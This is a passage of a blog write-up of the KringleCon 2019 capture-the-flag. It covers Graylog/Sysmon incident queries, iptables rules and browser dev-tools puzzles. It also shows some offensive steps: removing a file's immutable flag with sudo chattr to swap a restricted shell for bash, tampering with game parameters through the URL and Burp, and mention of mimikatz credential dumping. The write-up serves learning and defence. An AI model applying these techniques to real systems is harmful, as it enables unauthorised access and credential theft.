<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="[map[name:MindYourPrivacy]]">
<meta name="description" content="Reverse Engineering
" />
<meta name="keywords" content=", chattr, itertools, graylog, sysmon, iptables, javascript, DeepBlue, password-spray, windows-logs, EQL, powershell, splunk, mimikatz, lsass, stoq, RITA, bro, zeek, mongo, jq, keys-biting, captcha, tensorflow, sqli, sqlmap-tamper, csrf-proxy, cryptanalysis, DES, prng, seed, sqlite" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://0xade1.github.io/devdraft/posts/2019/12/kringlecon-2019/" />


    <title>
        
            Kringlecon 2019 :: Poney Island  â€” Welcome to Pwnie Island
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://0xade1.github.io/devdraft/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
    <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="Kringlecon 2019">
<meta itemprop="description" content="Reverse Engineering
"><meta itemprop="datePublished" content="2019-12-25T00:54:12+08:00" />
<meta itemprop="dateModified" content="2019-12-25T00:54:12+08:00" />
<meta itemprop="wordCount" content="7754"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
<meta itemprop="keywords" content="chattr,itertools,graylog,sysmon,iptables,javascript,DeepBlue,password-spray,windows-logs,EQL,powershell,splunk,mimikatz,lsass,stoq,RITA,bro,zeek,mongo,jq,keys-biting,captcha,tensorflow,sqli,sqlmap-tamper,csrf-proxy,cryptanalysis,DES,prng,seed,sqlite," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>

<meta name="twitter:title" content="Kringlecon 2019"/>
<meta name="twitter:description" content="Reverse Engineering
"/>




    <meta property="og:title" content="Kringlecon 2019" />
<meta property="og:description" content="Reverse Engineering
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xade1.github.io/devdraft/posts/2019/12/kringlecon-2019/" /><meta property="og:image" content="https://0xade1.github.io/devdraft"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-12-25T00:54:12+08:00" />
<meta property="article:modified_time" content="2019-12-25T00:54:12+08:00" />






    <meta property="article:section" content="kringlecon" />



    <meta property="article:published_time" content="2019-12-25 00:54:12 &#43;0800 &#43;0800" />








    </head>

    
        <body>
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://0xade1.github.io/devdraft/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text"># cd /root/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://0xade1.github.io/devdraft/about/">About</a></li><li><a href="https://0xade1.github.io/devdraft/categories/">Categories</a></li><li><a href="https://0xade1.github.io/devdraft/posts/">Posts</a></li><li><a href="https://0xade1.github.io/devdraft/series/">Series</a></li><li><a href="https://0xade1.github.io/devdraft/tags/">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
  <line x1="16" y1="2" x2="16" y2="6"></line>
  <line x1="8" y1="2" x2="8" y2="6"></line>
  <line x1="3" y1="10" x2="21" y2="10"></line>
</svg>

  2019-12-24 


  
 |

      

      

      
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/kringlecon/">kringlecon</a></span>
        
        |


      
        |
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/kringlecon/">kringlecon</a></span>
        
        |


      

    </div>

    <article>
      <h1 class="post-title">
        <a href="https://0xade1.github.io/devdraft/posts/2019/12/kringlecon-2019/">Kringlecon 2019</a>
      </h1>

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/chattr/">chattr</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/itertools/">itertools</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/graylog/">graylog</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/sysmon/">sysmon</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/iptables/">iptables</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/javascript/">javascript</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/deepblue/">DeepBlue</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/password-spray/">password-spray</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/windows-logs/">windows-logs</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/eql/">EQL</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/powershell/">powershell</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/splunk/">splunk</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/mimikatz/">mimikatz</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/lsass/">lsass</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/stoq/">stoq</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/rita/">RITA</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/bro/">bro</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/zeek/">zeek</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/mongo/">mongo</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/jq/">jq</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/keys-biting/">keys-biting</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/captcha/">captcha</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/tensorflow/">tensorflow</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/sqli/">sqli</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/sqlmap-tamper/">sqlmap-tamper</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/csrf-proxy/">csrf-proxy</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/cryptanalysis/">cryptanalysis</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/des/">DES</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/prng/">prng</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/seed/">seed</a></span>
        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/sqlite/">sqlite</a></span>
        
    </p>


    </div>

      
        <div class="post-excerpt">Reverse Engineering
</div>
      

      
        <hr />
        <aside id="toc">
          <div class="toc-title"></div>

            
            <link rel="stylesheet" href="https://0xade1.github.io/devdraft/scss/_toc.min.381569c9197e6da109df728dd267dd570bde7f7e967b92d59404483a017f498b00b0434e20302334ff67d09c721024494068c58c94a8a44aa3128e5aef4ef8f0.css" integrity="sha512-OBVpyRl&#43;baEJ33KN0mfdVwvef36We5LVlARIOgF/SYsAsENOIDAjNP9n0JxyECRJQGjFjJSopEqjEo5a70748A==">
             <div class="toc">
                <input id="_toc" type="checkbox" name="_toc">
                <label class="collapse" for="_toc">Table of Contents&nbsp;
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline class="chevron-down" points="6 10 14 18 22 10"></polyline><polyline class="chevron-up" points="22 18 14 10 6 18"></polyline></svg>
                </label>
                <nav id="TableOfContents">
                     <nav id="TableOfContents">
  <ul>
    <li><a href="#solved-mini-challenges">Solved mini-challenges</a></li>
    <li><a href="#minty-graylogs">Minty Graylog&rsquo;s</a></li>
    <li><a href="#minty-candicanes-holiday-hack-trail">Minty CandiCane&rsquo;s Holiday Hack Trail</a></li>
    <li><a href="#kent-tinseltooth">Kent TinselTooth</a></li>
    <li><a href="#crate">CRATE</a></li>
    <li><a href="#objective---windows-log-analysis-evaluate-attack-outcome">Objective - windows log analysis: evaluate attack outcome</a></li>
    <li><a href="#objective---windows-log-analysis-determine-attacker-technique">Objective - windows log analysis: determine attacker technique</a></li>
    <li><a href="#powershell">Powershell</a></li>
    <li><a href="#splunk">SPLUNK</a>
      <ul>
        <li><a href="#training-quetions">training quetions:</a></li>
        <li><a href="#challenge-question">challenge question:</a></li>
      </ul>
    </li>
    <li><a href="#rita---real-intelligence-threat-analytics">RITA - Real Intelligence Threat Analytics</a></li>
    <li><a href="#mongo-challenge">Mongo challenge</a></li>
    <li><a href="#wunorse-openslae---zeek-logs-challenge">Wunorse Openslae - Zeek Logs challenge</a></li>
    <li><a href="#get-access-to-the-steam-tunnels">Get access to the steam tunnels</a></li>
    <li><a href="#frido-sleigh-contest-objective-8">Frido Sleigh contest (Objective 8)</a></li>
    <li><a href="#student-portal">Student Portal</a></li>
    <li><a href="#crypto-challenge">Crypto challenge</a></li>
    <li><a href="#objective-12-filter-out-poisoned-sources-of-weather-data">Objective 12 Filter out poisoned sources of weather data</a>
      <ul>
        <li><a href="#login-the-web-application">Login the web application</a></li>
      </ul>
    </li>
    <li><a href="#update-the-firewall-rules">Update the firewall rules</a></li>
  </ul>
</nav>
                </nav>
             </div>

        </aside>
        <hr />

      <div class="post-content">
        <h2 id="solved-mini-challenges">Solved mini-challenges</h2>
<ol>
<li>Escape Ed</li>
</ol>
<ul>
<li>CTRL-D</li>
</ul>
<ol start="2">
<li>Objective 1)</li>
</ol>
<ul>
<li>Turtle doves are in the student union near the chimney</li>
</ul>
<ol start="2">
<li>Objective 2) Unredact Threatening Document</li>
</ol>
<ul>
<li>Found the letter North-West of the Quad</li>
<li>The document is a PDF with hidden text; however just copy paste of the hidden section will reveal the Capital word we are looking for</li>
</ul>
<ol start="3">
<li>Alabaster snowball</li>
</ol>
<ul>
<li><code>sudo - l</code> we can execute with root privileges the command <code>chattr</code></li>
<li>chattr command can be used to add/remove attributes on a file</li>
<li>looking at /etc/passwd we can see the default shell is not /bin/bash but /bin/nsh, however we don&rsquo;t have write access</li>
<li>lsattr /bin/nsh show the immutable &lsquo;i&rsquo; flag attribute is activated</li>
<li>remove the immutable flag with <code>chattr -i /bin/nsh</code></li>
<li>overwrite /bin/nsh with /bin/bash</li>
<li><code>su - alabaster_snowball</code> with Password2</li>
</ul>
<ol start="4">
<li>Tangle Coalbox: password is 7331</li>
</ol>
<ul>
<li>one digit is repeated once</li>
<li>we have to type a prime number</li>
<li>looking at the keypad, we see 1,3,7 and Enter are used the most</li>
<li>I wrote a combi.py python script to get all prime permutations of 1,3,7,1 and 1,3,7,3 and 1,3,7,7</li>
<li>then I execute the script in bach <code>python combi.py | sort | uniq</code></li>
<li>I try all permutations and finally get the sesame to the dormitory (7331)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-combi.py" data-lang="combi.py"><span style="color:#ff79c6">from</span> itertools <span style="color:#ff79c6">import</span> permutations
primes <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">13</span>, <span style="color:#bd93f9">17</span>, <span style="color:#bd93f9">19</span>, <span style="color:#bd93f9">23</span>, <span style="color:#bd93f9">29</span>, <span style="color:#bd93f9">31</span>, <span style="color:#bd93f9">37</span>]
li <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;1&#39;</span>,<span style="color:#f1fa8c">&#39;3&#39;</span>,<span style="color:#f1fa8c">&#39;7&#39;</span>]
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> li:
    lis <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">list</span>(li)
    lis<span style="color:#ff79c6">.</span>append(i)
    <span style="color:#ff79c6">for</span> comb <span style="color:#ff79c6">in</span> permutations(lis, <span style="color:#bd93f9">4</span>):
      number <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(comb), <span style="color:#bd93f9">10</span>)
      isPrime <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
      <span style="color:#ff79c6">for</span> p <span style="color:#ff79c6">in</span> primes:
          <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> (number <span style="color:#ff79c6">%</span> p):
            isPrime <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
            <span style="color:#ff79c6">break</span>
      <span style="color:#ff79c6">if</span> isPrime:
        <span style="color:#8be9fd;font-style:italic">print</span>(number)
</code></pre></td></tr></table>
</div>
</div><h2 id="minty-graylogs">Minty Graylog&rsquo;s</h2>
<ul>
<li><a href="https://incident.elfu.org/?challenge=graylog&amp;id=f68d1b63-fec0-44b9-bea8-095dc8a1f78a&amp;username=nQUsPw3MuKATVGTR">Direct link</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon Event ID</a></li>
</ul>
<ol>
<li>
<p>We are looking for a file downloaded through Firefox, so best is to find
<code>Sysmon Event ID 2: A process changed a file creation time</code> from process &ldquo;firefox.exe&rdquo;</p>
<p>We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files.
We can use regular expressions to include or exclude patterns:</p>
<pre><code>FileCreateTime AND firefox NOT TargetFilename:/.+\.temp/
</code></pre>
<p><strong>Answer</strong>: C:\Users\minty\Downloads\cookie_recipe.exe</p>
</li>
<li>
<p>We can find which ip address the malicious file has connected with sysmon <code>EventID=3 (Network connection)</code> and by pivoting on ProcessImage name</p>
<pre><code>ProcessImage:/.+cookie_recipe.exe/ AND eventID=3
</code></pre>
<p><strong>Answer</strong>: 192.168.247.175:4444</p>
</li>
<li>
<p>with <code>Event ID 1: Process creation</code>, we can <code>pivot off</code> on child processes as we know cookie_recipe.exe ProcessId=5256</p>
<p>Alternatively, since all commands by the attacker are initially running through the cookie_recipe.exe binary,
we can set its full-path as our ParentProcessImage to <code>find child processes</code> it creates sorting on timestamp.</p>
<pre><code>ParentProcessImage:/.+cookie_recipe.exe/ AND eventID=1
</code></pre>
<p>or</p>
<pre><code>ParentProcessId:5256
</code></pre>
<p><strong>Answer</strong>: whoami</p>
</li>
<li>
<p>We keep scrolling down the result until we find a service
Continuing on using the cookie_reciper.exe binary as our ParentProcessImage,
we should see some more commands later on related to a service.</p>
<p><strong>Answer</strong>: webexservice</p>
</li>
<li>
<p>We can see all commands passed by the attacker by passing the binary path used for privileges escalation to ParentProcessCommandLine.
Indeed, The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe.
Let&rsquo;s use this binary path in our ParentProcessImage search.</p>
<pre><code>ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe CommandLine:/.+.exe/
</code></pre>
<p>We find some interesting arguments passed to an executable: <code>sekurlsa::logonpasswords</code>.
Those arguments are usually passed to mimikatz to activate a module that extracts passwords,
keys, pin codes, tickets from the memory of <code>lsass (Local Security Authority Subsystem Service)</code></p>
<p><strong>Answer</strong>: C:\cookie.exe</p>
</li>
<li>
<p>Let&rsquo;s try to see 5 minutes surrounding last <code>mimikatz</code> message for Logon event (EventId=4624).
According to <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624">this resource</a>
4624 is a highly valuable event since it documents each and every successful attempt to logon to the local computer
regardless of logon type, location of the user or type of account.</p>
<p>How do we know it is not legitimate login? Because it comes from the Address of the attacker:</p>
<pre><code>EventID:4624 AND SourceNetworkAddress:192.168.247.175
</code></pre>
<p><strong>Answer</strong>: alabaster</p>
</li>
<li>
<p>We can <code>identify RDP connection</code> with successful Logon Event (4624) having Type=10 (Remote Desktop)</p>
<pre><code>EventID:4624 AND LogonType:10
</code></pre>
<p><strong>Answer</strong>: 06:04:28 ** (HH:MM:SS)</p>
</li>
<li>
<p><code>LogonType=3 (File share access)</code>
The attacker has GUI access to workstation 2 via RDP.
They likely use this GUI connection to access the file system of of workstation 3 using explorer.exe
via UNC file paths (which is why we don&rsquo;t see any cmd.exe or powershell.exe process creates).
However, we still see the successful network authentication for this with event id 4624 and logon type 3.
We are looking for file sharing access which is logon type=3.
We can also exclude the original address of the attacker as we are informed that he pivots from the workstation 2 (the host he connected with RDP)</p>
<pre><code>EventID:4624 AND LogonType:3 AND NOT SourceNetworkAddress:192.168.247.175
</code></pre>
<p><strong>Answer</strong>: elfu-res-wks2,elfu-res-wks3,3 (SourceHostName,DestinationHostname,LogonType)</p>
</li>
<li>
<p>We look first for <code>EventID:3 (Network Connection)</code> having as a source workstation 3 (elfu-res-wks3) and as a destination workstation 2 (elfu-res-wks2).
I have a bit struggled because I had to use wildcard for my graylog query to include results having domain name &lsquo;.localdomain&rsquo;</p>
<pre><code>DestinationHostname:/elfu-res-wks2.*/ AND SourceHostname:/elfu-res-wks3.*/
</code></pre>
<p>There is only two messages with EventID:3 after the initial RDP connection (see answer 7).</p>
<p>Common sense would be to pivot few seconds after this message and look for file creation on destination the host:</p>
<p><code>EventID 2 (a Process changed a file creation time)</code> or <code>EventID 11 (FileCreate)</code> should do the job</p>
<pre><code>source:&quot;elfu\-res\-wks2&quot; AND EventID:2 AND _exists_:TargetFilename
</code></pre>
<p>We can look for sysmon file creation event id of 2 with a source of workstation 2.
We can also use regex to filter out overly common file paths using something like:</p>
<pre><code>source:&quot;elfu\-res\-wks2&quot; AND EventID:2 AND _exists_:TargetFilename AND NOT TargetFilename:/.+ProgramData.+/
</code></pre>
<p><strong>Answer</strong>: C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</p>
</li>
<li>
<p>Searching for <code>super_secret_elfu_research.pdf</code> after 06:05:03, we figure out the file was transfered to <code>pastebin.com</code>
Instead of trying all IP adresses from whois, we prefer look for connection from workstation 2 to domain &lsquo;pastebin.com&rsquo;</p>
<p>We can look for the original document in CommandLine using regex.
When we do that, we see a long a long PowerShell command using Invoke-Webrequest to a remote URL of <a href="https://pastebin.com/post.php">https://pastebin.com/post.php</a>.
We can pivot off of this information to look for a sysmon <code>EventID:3 (Network Connection)</code> with a source of elfu-res-wks2 and DestinationHostname of pastebin.com.</p>
<pre><code>EventID:3 AND source:&quot;elfu\-res\-wks2&quot; AND DestinationHostname:pastebin.com
</code></pre>
<p><strong>Answer</strong>: 104.22.3.84</p>
</li>
</ol>
<p>Finally we get the Flag</p>
<pre><code>Incident Response Report #7830984301576234 Submitted.
Incident Fully Detected!
</code></pre>
<h2 id="minty-candicanes-holiday-hack-trail">Minty CandiCane&rsquo;s Holiday Hack Trail</h2>
<ul>
<li><a href="https://trail.elfu.org/gameselect/?playerid=2c621f0a-38d6-4e1d-b05b-abc55ab03195">direct url</a></li>
</ul>
<p>Looking at the url, we quickly figure out the Game in &lsquo;Easy&rsquo; mode communicates with the server with HTTP GET protocol without any server validation of inputs.</p>
<pre><code>hhc://trail.hhc/trail/?difficulty=0&amp;distance=670&amp;money=9964&amp;pace=0&amp;curmonth=12&amp;curday=20
&amp;reindeer=99&amp;runners=6&amp;ammo=64&amp;meds=22&amp;food=347&amp;name0=Chris&amp;health0=100&amp;cond0=0&amp;causeofdeath0=&amp;deathday0=0&amp;deathmonth0=0&amp;name1=Sally&amp;health1=100&amp;cond1=1&amp;causeofdeath1=&amp;deathday1=0&amp;deathmonth1=0&amp;name2=Jen&amp;health2=100&amp;cond2=0&amp;causeofdeath2=&amp;deathday2=0&amp;deathmonth2=0&amp;name3=John&amp;health3=100&amp;cond3=0&amp;causeofdeath3=&amp;deathday3=0&amp;deathmonth3=0
</code></pre>
<p>We can simply change the distance in the url to 8000 and click &lsquo;Go&rsquo; &hellip; BAM, we won the party.</p>
<pre><code>Your party has succeeded!

    Lila is happier than an elf in a toy shop!
    Dop is ready to jingle bell rock!
    Jo is ecstatic!
    Chris is over the moon!
    Date completed: 2 July
    Reindeer remaining: 2
    Money remaining: 5000

Scoring:

    4 surviving party members X 1000 = 4000 points
    2 reindeer X 400 = 800 points
    5000 money left X 1 = 5000 points
    Journey completed on 2 July: 176 days before Christmas X 50 = 8800 points
    Total score: (4000 + 800 + 5000 + 8800) X 1 Easy multiplier = 18600!
    Verification hash: 2e668469748566b41e9dffbafc04f67b
</code></pre>
<p>Hmmm, this challenge seems way too easy &hellip; Wait a minute, Minty is not giving us any hint and is still asking help to solve the challenge!
It may be because I&rsquo;ve used the direct url to the trail game instead of the browser &hellip;
somehow I might have to do it from within Kringlecon instead of spending more effort.</p>
<p>So I choose the lazy way and use Burp instead: this time parameter are passed in HTTP POST but it does not really make any difference with BURP :).
Challenge is won, Minty is giving hints on making Key from a picture.</p>
<p>The HARD challenge is much harder because this time the server control a hash value and will detect when we tamper with the distance parameter.</p>
<h2 id="kent-tinseltooth">Kent TinselTooth</h2>
<ul>
<li><a href="https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands">iptables</a></li>
</ul>
<p>His inner voice may comes from an attacker compromising his IOT teeth braces.
He could exfiltrate information such as some prototype being hosted with default credentials in srf.elfu.org; it&rsquo;s not related to this challenge.
We need resources on <a href="https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands">iptables here</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo iptables -P FORWARD DROP
<span style="color:#6272a4">#The following is an example of allowing traffic from a specific IP and to a specific port:</span>
sudo iptables -A INPUT -p tcp --dport <span style="color:#bd93f9">25</span> -s 172.18.5.4 -j ACCEPT
</code></pre></td></tr></table>
</div>
</div><p>Below are the instructions to win this challenge:</p>
<ol>
<li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.</li>
<li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.</li>
<li>Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).</li>
<li>Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.</li>
<li>Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.</li>
<li>Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface</li>
</ol>
<p>My solution is the following:</p>
<pre><code>sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
</code></pre>
<h2 id="crate">CRATE</h2>
<p>There is a hidden div object in the Student Union with class=&lsquo;crate&rsquo;. indeed his css style attribute <code>display: none</code>.</p>
<p>Changing it to the value <code>display: block</code> and changing the z-layer to a higher value did not help either as it is below the floor div objects.
The hint says we can move elements? maybe we can pull the lid off.</p>
<ol>
<li>
<p>Open Firefox Developer tools console, and the code will be right there: ** B3PLY0XQ ** (the code will change when page is reloaded)</p>
</li>
<li>
<p>This one got me busy for some time, until I figure out there were more hints; simply Print preview the page as a PDF within Firefox and the code will be obviously stamped: J092WFRA (the code chage when we reload the page)</p>
</li>
<li>
<p>Looking at DEvTools Network view, we observe an image has been downloaded many times. Looking at it, we get the flag</p>
</li>
<li>
<p>We look at devTools storage. Amazing, the barrels object containing the code is in a form of a key-value pair in the &lsquo;Local Storage&rsquo;</p>
</li>
<li>
<p>Lol, I tried to copy the code in the html:title tags from source but it did not work. Typing in the console <code>document.title</code> reveals the title has been changed with a new code.</p>
</li>
<li>
<p>The hint is &lsquo;perspective&rsquo; is css property, so let&rsquo;s try the devTools Inspector. Changing the perspective value to &lsquo;px&rsquo; or increasing the transition period reveals the code</p>
</li>
<li>
<p>The hint instructed us to look at the first entry of the css font-family. Indeed the flag is there.</p>
</li>
<li>
